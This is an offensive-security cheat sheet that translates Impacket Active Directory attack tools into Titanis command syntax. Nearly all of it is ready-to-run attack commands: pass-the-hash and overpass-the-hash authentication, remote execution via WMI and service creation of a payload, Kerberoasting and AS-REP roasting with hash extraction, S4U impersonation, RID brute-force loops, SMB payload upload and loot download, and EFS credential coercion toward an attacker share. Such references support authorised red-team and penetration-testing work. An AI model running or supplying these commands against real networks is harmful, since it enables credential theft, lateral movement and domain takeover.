# Impacket → Titanis Transition Cheat Sheet

As an operational note, here are some key behavioral differences between Impacket and Titanis:
- Auth is explicit — no session fallback, no implicit AD lookups
- Both `.kirbi` and `.ccache` ticket files work natively (no conversion needed)
- `KRB5CCNAME` env var is honoured — set it to keep a per-user cache
- Kerberos only activates when `-Kdc` is specified
- Output format is selectable: `-OutputStyle Table|Json|Csv|Tsv|List|Raw`
- Tool names are PascalCase verbs: `Wmi`, `Kerb`, `Smb2Client`, `Lsa`, `Sam`, `Scm`, `Epm`, `CredCoerce`

---

## Authentication Quick Reference

### Titanis

**Password** (NTLM or Kerberos depending on `-Kdc`)
```
-UserName DOMAIN\user -Password pass
-UserName user@DOMAIN -Password pass
-UserName user -UserDomain DOMAIN -Password pass
```

**NTLM hash — pass-the-hash** (no colons, no LM)
```
-UserName DOMAIN\user -NtlmHash <nthash>
```

**NTLM hash + Kerberos RC4 — overpass-the-hash**
```
-UserName DOMAIN\user -NtlmHash <nthash> -Kdc DC
```

**AES key — Kerberos only**
```
-UserName DOMAIN\user -AesKey <aeskey> -Kdc DC
```

**TGT file** (Titanis requests service tickets automatically)
```
-UserName DOMAIN\user -Tgt user.kirbi -Kdc DC
```

**Ticket cache** (kirbi or ccache, reused across commands)
```
-TicketCache user.ccache -Kdc DC
export KRB5CCNAME=user.ccache    # then omit -TicketCache
```

**Misc**
```
-4 / -6              # force IPv4 or IPv6
-Socks5 127.0.0.1:1080
```

### Impacket

**Password**
```
domain/user:pass@TARGET
```

**NTLM hash — pass-the-hash**
```
-hashes :nthash        # NT only
-hashes lmhash:nthash  # LM:NT
```

**AES key**
```
-aesKey <aeskey>
```

**Kerberos ticket (ccache)**
```
export KRB5CCNAME=user.ccache
tool.py -k -no-pass domain/user@TARGET
```

**DC specification**
```
-dc-ip 10.0.0.1
```

---

## Remote Code Execution

### WMI Exec (`wmiexec.py` → `Wmi exec`)

Executes a command via WMI Win32_Process.Create. Output is captured through a temp file on the
remote ADMIN$ share and streamed back.

**Password**
```bash
# Impacket
wmiexec.py DOMAIN/user:pass@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -UserName DOMAIN\user -Password pass
```

**Pass-the-Hash**
```bash
# Impacket
wmiexec.py -hashes :nthash DOMAIN/user@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -UserName DOMAIN\user -NtlmHash <nthash>
```

**Kerberos Ticket**
```bash
# Impacket
export KRB5CCNAME=user.ccache
wmiexec.py -k -no-pass DOMAIN/user@TARGET 'whoami'

# Titanis
Wmi exec TARGET 'whoami' -TicketCache user.ccache -Kdc DC
```

> Titanis flags: `-CmdCall:off` to skip `cmd /q /c` wrapper; `-CaptureOutput:off` for fire-and-forget; `-Wait:off` for async.

---

### Service-Based Exec / PsExec-style (`psexec.py` / `smbexec.py` → `Scm create`)

Impacket's psexec and smbexec deploy a service binary. The Titanis equivalent is `Scm create`
with `-Start` to create and immediately start the service.

**Password**
```bash
# Impacket
psexec.py DOMAIN/user:pass@TARGET
smbexec.py DOMAIN/user:pass@TARGET

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -Password pass
```

**Pass-the-Hash**
```bash
# Impacket
psexec.py -hashes :nthash DOMAIN/user@TARGET

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -NtlmHash <nthash>
```

**Kerberos Ticket**
```bash
# Impacket
export KRB5CCNAME=user.ccache
psexec.py -k -no-pass DOMAIN/user@TARGET

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -TicketCache user.ccache -Kdc DC
```

**Cleanup**
```bash
Scm stop   TARGET mySvc -UserName DOMAIN\user -Password pass
Scm delete TARGET mySvc -UserName DOMAIN\user -Password pass
```

---

## Kerberos Attacks

### Request TGT (`getTGT.py` → `Kerb asreq`)

> Positional args: `Kerb asreq <user@REALM> <KDC>`. Use `-Realm DOMAIN` if the username has no `@domain`.

**Password**
```bash
# Impacket
getTGT.py DOMAIN/user:pass -dc-ip DC

# Titanis
Kerb asreq user@DOMAIN DC -Password pass -OutputFileName user.kirbi -Overwrite
```

**NTLM Hash** (RC4 TGT)
```bash
# Impacket
getTGT.py -hashes :nthash DOMAIN/user -dc-ip DC

# Titanis
Kerb asreq user@DOMAIN DC -NtlmHash <nthash> -OutputFileName user.kirbi -Overwrite

# Titanis — request RC4 enc type explicitly
Kerb asreq user@DOMAIN DC -NtlmHash <nthash> -EncTypes Rc4Hmac \
    -OutputFileName user.kirbi -Overwrite
```

**AES Key**
```bash
# Impacket
getTGT.py -aesKey <aeskey> DOMAIN/user -dc-ip DC

# Titanis — AES 256
Kerb asreq user@DOMAIN DC -AesKey <aeskey256> -OutputFileName user.kirbi -Overwrite

# Titanis — AES 128
Kerb asreq user@DOMAIN DC -AesKey <aeskey128> \
    -EncTypes Aes128CtsHmacSha1_96 -OutputFileName user.kirbi -Overwrite
```

---

### Request Service Ticket (`getST.py` → `Kerb tgsreq`)

**From TGT file**
```bash
# Impacket
getST.py -spn cifs/TARGET -dc-ip DC DOMAIN/user:pass

# Titanis
Kerb tgsreq DC cifs/TARGET -Tgt user.kirbi -OutputFileName user-cifs.kirbi
```

**Multiple SPNs in one shot**
```bash
# Titanis
Kerb tgsreq DC 'cifs/TARGET, host/TARGET' \
    -Tgt user.kirbi -OutputFileName user-cifs.kirbi
```

**Pass-the-Hash**
```bash
# Impacket
getST.py -spn cifs/TARGET -hashes :nthash -dc-ip DC DOMAIN/user

# Titanis — using ticket cache (requests TGT automatically if missing)
Kerb tgsreq DC cifs/TARGET -TicketCache user.ccache \
    -UserName DOMAIN\user -NtlmHash <nthash> -Kdc DC
```

**Kerberos Ticket**
```bash
# Impacket
getST.py -spn cifs/TARGET -k -no-pass -dc-ip DC DOMAIN/user

# Titanis
Kerb tgsreq DC cifs/TARGET -TicketCache user.ccache -Kdc DC
```

**S4U2proxy — impersonation**
```bash
# Impacket
getST.py -spn cifs/TARGET -impersonate Administrator \
    -dc-ip DC DOMAIN/svc_account:pass

# Titanis (inline with the command that uses it)
Wmi exec TARGET whoami \
    -UserName DOMAIN\svc_account -Password pass -Kdc DC \
    -S4UserName Administrator@DOMAIN -S4ProxyService host/TARGET
```

---

### Kerberoasting (`GetUserSPNs.py` → `Kerb tgsreq` + `Kerb select`)

Impacket discovers and requests all service tickets in one pass. With Titanis, enumerate
SPNs first, then request tickets and extract hashes.

> The `TicketHash` output is in `$krb5tgs$23$*...*` format — Hashcat mode 13100.

**Step 1 — Get TGT**
```bash
# Impacket
GetUserSPNs.py -request DOMAIN/user:pass -dc-ip DC

# Titanis
Kerb asreq user@DOMAIN DC -Password pass -OutputFileName user.kirbi -Overwrite
```

**Step 2 — Request RC4-encrypted service ticket**
```bash
# Titanis (RC4 is weakest / most crackable)
Kerb tgsreq DC 'MSSQLSvc/sql01.DOMAIN:1433' \
    -Tgt user.kirbi -EncTypes Rc4Hmac -OutputFileName svc.kirbi -Overwrite
```

**Step 3 — Extract hash**
```bash
# Impacket (built-in to step 1 above)

# Titanis
Kerb select -From svc.kirbi -OutputFields TicketHash
```

---

### AS-REP Roasting (`GetNPUsers.py` → `Kerb asreq` without preauth)

Targets accounts with "Do not require Kerberos preauthentication" set.

> The `TicketHash` output is in `$krb5asrep$23$*...*` format — Hashcat mode 18200.

**Single account**
```bash
# Impacket
GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip DC -no-pass -format hashcat

# Titanis — succeeds only if the account has preauth disabled
Kerb asreq targetuser@DOMAIN DC -OutputFileName asrep.kirbi -Overwrite
Kerb select -From asrep.kirbi -OutputFields TicketHash
```

**Loop over a user list**
```bash
# Impacket
GetNPUsers.py DOMAIN/user:pass -dc-ip DC -request -format hashcat

# Titanis
for user in $(cat users.txt); do
    Kerb asreq "${user}@DOMAIN" DC -OutputFileName "${user}.kirbi" -Overwrite 2>/dev/null \
    && Kerb select -From "${user}.kirbi" -OutputFields TicketHash
done
```

---

### Key Derivation (`n/a` → `Kerb s2k`)

Derives Kerberos AES/RC4 keys from a password and salt. No Impacket equivalent.

> Get the correct salt first with `Kerb getasinfo user@DOMAIN DC`.
> Windows salt format: `DOMAIN.FQDNusername` (FQDN uppercase + username lowercase, no separator).

**All key types**
```bash
Kerb s2k DOMAIN.COMuser pass
```

**AES keys only**
```bash
Kerb s2k DOMAIN.COMuser pass -EncTypes Aes128CtsHmacSha1_96, Aes256CtsHmacSha1_96
```

**Computer account** (salt uses `host` prefix + FQDN)
```bash
Kerb s2k DOMAIN.COMhostDC01.domain.com 'machinepassword!'
```

---

### Ticket Renewal (`n/a` → `Kerb renew`)

No Impacket equivalent. Renews a renewable ticket before it expires.

**From file**
```bash
Kerb renew DC -Ticket user.kirbi -OutputFileName user.kirbi -Overwrite
```

**From cache — specific SPN**
```bash
Kerb renew DC -TicketCache user.ccache -TargetSpn 'cifs/TARGET'
```

---

### Password Change via Kerberos (`changepasswd.py` → `Kerb changepw` / `Kerb setpw`)

**Change own password**
```bash
# Impacket
changepasswd.py -k -no-pass DOMAIN/user@DC -newpassword 'NewPass1!'

# Titanis — password
Kerb changepw user@DOMAIN DC 'NewPass1!' -Password 'OldPass'

# Titanis — NTLM hash
Kerb changepw user@DOMAIN DC 'NewPass1!' -NtlmHash <nthash>
```

**Set another user's password**
```bash
# Impacket
changepasswd.py DOMAIN/admin:AdminPass@DC -altuser targetuser \
    -altpass OldPass -newpassword 'NewPass1!'

# Titanis — with password
Kerb setpw targetuser@DOMAIN 'NewPass1!' \
    -UserName DOMAIN\admin -Password AdminPass -Kdc DC

# Titanis — with TGT
Kerb setpw targetuser@DOMAIN 'NewPass1!' -Tgt admin.kirbi -Kdc DC
```

---

## Ticket Format Conversion (`ticketConverter.py` → `Kerb select`)

Titanis reads both `.kirbi` and `.ccache` natively — conversion is done by specifying the output extension.

**kirbi → ccache**
```bash
# Impacket
ticketConverter.py user.kirbi user.ccache

# Titanis
Kerb select -From user.kirbi -Into user.ccache -Overwrite
```

**ccache → kirbi**
```bash
# Impacket
ticketConverter.py user.ccache user.kirbi

# Titanis
Kerb select -From user.ccache -Into user.kirbi -Overwrite
```

**Combine multiple files**
```bash
Kerb select -From '*.kirbi' -Into combined.ccache -Overwrite
```

**Inspect tickets** (SPN, user, expiry, enc type)
```bash
Kerb select -From user.kirbi
```

**Show only currently-valid tickets**
```bash
Kerb select -From user.ccache -Current
```

**Filter by SPN (regex)**
```bash
Kerb select -From '*.kirbi' -MatchingSpn 'cifs/.*'
```

---

## SMB File Operations (`smbclient.py` → `Smb2Client`)

The Titanis `Smb2Client` uses UNC paths: `\\SERVER\SHARE\path`

### Enumerate Shares

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET  # then: shares
```

```bash
# Titanis — password
Smb2Client enumshares TARGET -UserName DOMAIN\user -Password pass

# Titanis — pass-the-hash
Smb2Client enumshares TARGET -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — Kerberos
Smb2Client enumshares TARGET -TicketCache user.ccache -Kdc DC
```

### List Directory

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET  # then: use C$; ls
```

```bash
# Titanis — password
Smb2Client ls '\\TARGET\C$' -UserName DOMAIN\user -Password pass

# Titanis — pass-the-hash
Smb2Client ls '\\TARGET\C$\Windows\Temp' -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — Kerberos
Smb2Client ls '\\TARGET\C$' -TicketCache user.ccache -Kdc DC
```

### Download File

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET  # then: use C$; get Windows\Temp\loot.txt

# Titanis
Smb2Client get '\\TARGET\C$\Windows\Temp\loot.txt' ./loot.txt \
    -UserName DOMAIN\user -Password pass
```

### Upload File

```bash
# Impacket
smbclient.py DOMAIN/user:pass@TARGET  # then: put payload.exe Windows\Temp\payload.exe

# Titanis
Smb2Client put payload.exe '\\TARGET\C$\Windows\Temp\payload.exe' \
    -UserName DOMAIN\user -Password pass
```

### Delete File

```bash
# Impacket (interactive): rm Windows\Temp\old.txt

# Titanis
Smb2Client rm '\\TARGET\C$\Windows\Temp\old.txt' \
    -UserName DOMAIN\user -Password pass
```

### Make Directory

```bash
# Impacket (interactive): mkdir Windows\Temp\newdir

# Titanis
Smb2Client mkdir '\\TARGET\C$\Windows\Temp\newdir' \
    -UserName DOMAIN\user -Password pass
```

### Enumerate Sessions

```bash
# Titanis
Smb2Client enumsessions TARGET -UserName DOMAIN\user -Password pass
```

### Enumerate Open Files

```bash
# Titanis
Smb2Client enumopenfiles TARGET -UserName DOMAIN\user -Password pass
```

### Enumerate Snapshots (VSS)

```bash
# Titanis
Smb2Client enumsnapshots '\\TARGET\C$\Windows' -UserName DOMAIN\user -Password pass
```

---

## Enumeration

### SID → Name (`lookupsid.py` → `Lsa lookupsid`)

```bash
# Impacket
lookupsid.py DOMAIN/user:pass@TARGET
lookupsid.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — password
Lsa lookupsid TARGET S-1-5-21-111-222-333-500 \
    -UserName DOMAIN\user -Password pass

# Titanis — multiple SIDs
Lsa lookupsid TARGET S-1-5-21-111-222-333-500 S-1-5-21-111-222-333-1103 \
    -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — Kerberos
Lsa lookupsid TARGET S-1-5-21-111-222-333-1103 \
    -TicketCache user.ccache -Kdc DC
```

**RID brute-force** (equivalent to lookupsid.py's enumeration behaviour)
```bash
for i in $(seq 500 1200); do
    Lsa lookupsid TARGET "S-1-5-21-<domain_rid>-${i}" \
        -UserName DOMAIN\user -NtlmHash <nthash> 2>/dev/null
done
```

### Name → SID (`lookupsid.py` → `Lsa lookupname`)

```bash
# Titanis
Lsa lookupname TARGET user Administrator \
    -UserName DOMAIN\user -Password pass
```

### User Enumeration via SAMR (`samrdump.py` → `Sam enumusers`)

```bash
# Impacket
samrdump.py DOMAIN/user:pass@TARGET
samrdump.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — password
Sam enumusers TARGET -UserName DOMAIN\user -Password pass

# Titanis — pass-the-hash
Sam enumusers TARGET -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — Kerberos
Sam enumusers TARGET -TicketCache user.ccache -Kdc DC

# Titanis — table output with specific fields
Sam enumusers TARGET -UserName DOMAIN\user -Password pass \
    -OutputStyle Table -OutputFields AccountName, FullName, LastLogon
```

### RPC Endpoint Mapping (`rpcdump.py` → `Epm lsep`)

```bash
# Impacket
rpcdump.py DOMAIN/user:pass@TARGET
rpcdump.py -hashes :nthash DOMAIN/user@TARGET
```

```bash
# Titanis — password
Epm lsep TARGET -UserName DOMAIN\user -Password pass

# Titanis — pass-the-hash
Epm lsep TARGET -UserName DOMAIN\user -NtlmHash <nthash>

# Titanis — Kerberos
Epm lsep TARGET -TicketCache user.ccache -Kdc DC
```

**Filter by interface ID**
```bash
Epm lsep TARGET -UserName DOMAIN\user -Password pass \
    -InterfaceId 12345678-1234-1234-1234-123456789abc
```

**Table output**
```bash
Epm lsep TARGET -UserName DOMAIN\user -Password pass -OutputStyle Table
```

### LSA Account Enumeration (Titanis-only)

No direct Impacket equivalent.

**Enumerate all accounts in LSA database**
```bash
Lsa enumaccounts TARGET -UserName DOMAIN\user -Password pass

# with names and domains
Lsa enumaccounts TARGET -UserName DOMAIN\user -Password pass \
    -OutputFields Sid, AccountName, DomainName
```

**Enumerate accounts holding a specific privilege**
```bash
Lsa enumprivaccounts TARGET -Privilege SeDebugPrivilege \
    -UserName DOMAIN\user -Password pass

Lsa enumprivaccounts TARGET -Privilege SeInteractiveLogonRight \
    -UserName DOMAIN\user -NtlmHash <nthash>
```

### WMI Queries (`wmiquery.py` → `Wmi query`)

```bash
# Impacket
wmiquery.py -query 'SELECT * FROM Win32_Process' DOMAIN/user:pass@TARGET
```

**Password**
```bash
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -UserName DOMAIN\user -Password pass
```

**Pass-the-Hash**
```bash
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -UserName DOMAIN\user -NtlmHash <nthash>
```

**Kerberos**
```bash
Wmi query TARGET 'SELECT * FROM Win32_Process' \
    -TicketCache user.ccache -Kdc DC
```

**Custom namespace**
```bash
Wmi query TARGET 'SELECT * FROM AntiVirusProduct' \
    -Namespace 'root\SecurityCenter2' \
    -UserName DOMAIN\user -Password pass
```

**Table output**
```bash
Wmi query TARGET 'SELECT * FROM Win32_OperatingSystem' \
    -UserName DOMAIN\user -Password pass -OutputStyle Table
```

---

## Service Management (`services.py` → `Scm`)

### Query Status

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET status <svc>

# Titanis
Scm query TARGET mySvc -UserName DOMAIN\user -Password pass
Scm query TARGET mySvc -UserName DOMAIN\user -NtlmHash <nthash>
Scm query TARGET mySvc -TicketCache user.ccache -Kdc DC
```

### Start

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET start <svc>

# Titanis
Scm start TARGET mySvc -UserName DOMAIN\user -Password pass
```

### Stop

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET stop <svc>

# Titanis
Scm stop TARGET mySvc -UserName DOMAIN\user -Password pass
```

### Create and Start

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET create <svc> binPath= 'C:\path\to\exe.exe'

# Titanis
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -Start -UserName DOMAIN\user -Password pass

# Titanis — run as a specific service account
Scm create TARGET mySvc 'C:\Windows\Temp\payload.exe' \
    -StartName 'DOMAIN\svc_user' -StartPassword 'SvcPass!' \
    -Start -UserName DOMAIN\user -Password pass
```

### Delete

```bash
# Impacket
services.py DOMAIN/user:pass@TARGET delete <svc>

# Titanis
Scm delete TARGET mySvc -UserName DOMAIN\user -Password pass
```

---

## Credential Coercion (Titanis-only: `CredCoerce`)

No Impacket equivalent. Uses EFS (MS-EFSR) RPC calls to coerce a target to authenticate
to an arbitrary UNC path (for relay or capture).

**All techniques — password**
```bash
CredCoerce -Techniques '*' TARGET '\\ATTACKER\share' \
    -UserName DOMAIN\user -Password pass
```

**All techniques — pass-the-hash**
```bash
CredCoerce -Techniques '*' TARGET '\\ATTACKER\share' \
    -UserName DOMAIN\user -NtlmHash <nthash>
```

**All techniques — Kerberos**
```bash
CredCoerce -Techniques '*' TARGET '\\ATTACKER\share' \
    -TicketCache user.ccache -Kdc DC
```

**Specific technique only**
```bash
CredCoerce -Techniques 'Efs.OpenFile' TARGET '\\ATTACKER\share' \
    -UserName DOMAIN\user -Password pass
```

**Available techniques**
```
Efs.OpenFile                 Efs.EncryptFile              Efs.DecryptFile
Efs.QueryUsersOnFile         Efs.QueryRecoveryAgents      Efs.RemoveUsersFromFile
Efs.AddUsersToFile           Efs.FileKeyInfo              Efs.DuplicateEncryptionInfoFile
Efs.AddUsersToFileEx         Efs.FileKeyInfoEx            Efs.GetEncryptedFileMetadata
Efs.SetEncryptedFileMetadata Efs.EncryptFileExSrv
```

---

## Still Impacket Only

> The following tools have **no Titanis equivalent** as of early 2026.
> Continue using Impacket for these.

| Tool | Purpose |
|------|---------|
| `secretsdump.py` | Remote NTDS/SAM/LSA secrets dump (DCSync, shadow copy, registry) |
| `ntlmrelayx.py` | NTLM relay attacks, SMB/HTTP/LDAP relay chains |
| `ticketer.py` | Golden ticket / Silver ticket forging |
| `reg.py` | Remote registry read/write |
| `dacledit.py` | ACL/DACL modification on AD objects |
| `rbcd.py` | Resource-based constrained delegation attacks |
| `addcomputer.py` | Machine account creation via LDAP/SAMR |
| `raiseChild.py` | Child domain to forest root escalation (MS14-068) |
| `goldenPac.py` | MS14-068 Kerberos privilege escalation |
| `atexec.py` | Remote command via Task Scheduler (AT service) |
| `dcomexec.py` | Remote command via DCOM (MMC20, ShellWindows, ShellBrowserWindow) |
| `GetLAPSPassword.py` | Read LAPS passwords from AD |
| `Get-GPPPassword.py` | Extract credentials from Group Policy Preferences |
| `findDelegation.py` | Enumerate Kerberos delegation configurations |
| `dpapi.py` | DPAPI masterkey/credential/vault decryption |
| `mssqlclient.py` | Interactive MSSQL client (xp_cmdshell, file ops) |
| `ntfs-read.py` | Direct NTFS read via Volume Shadow Copy |
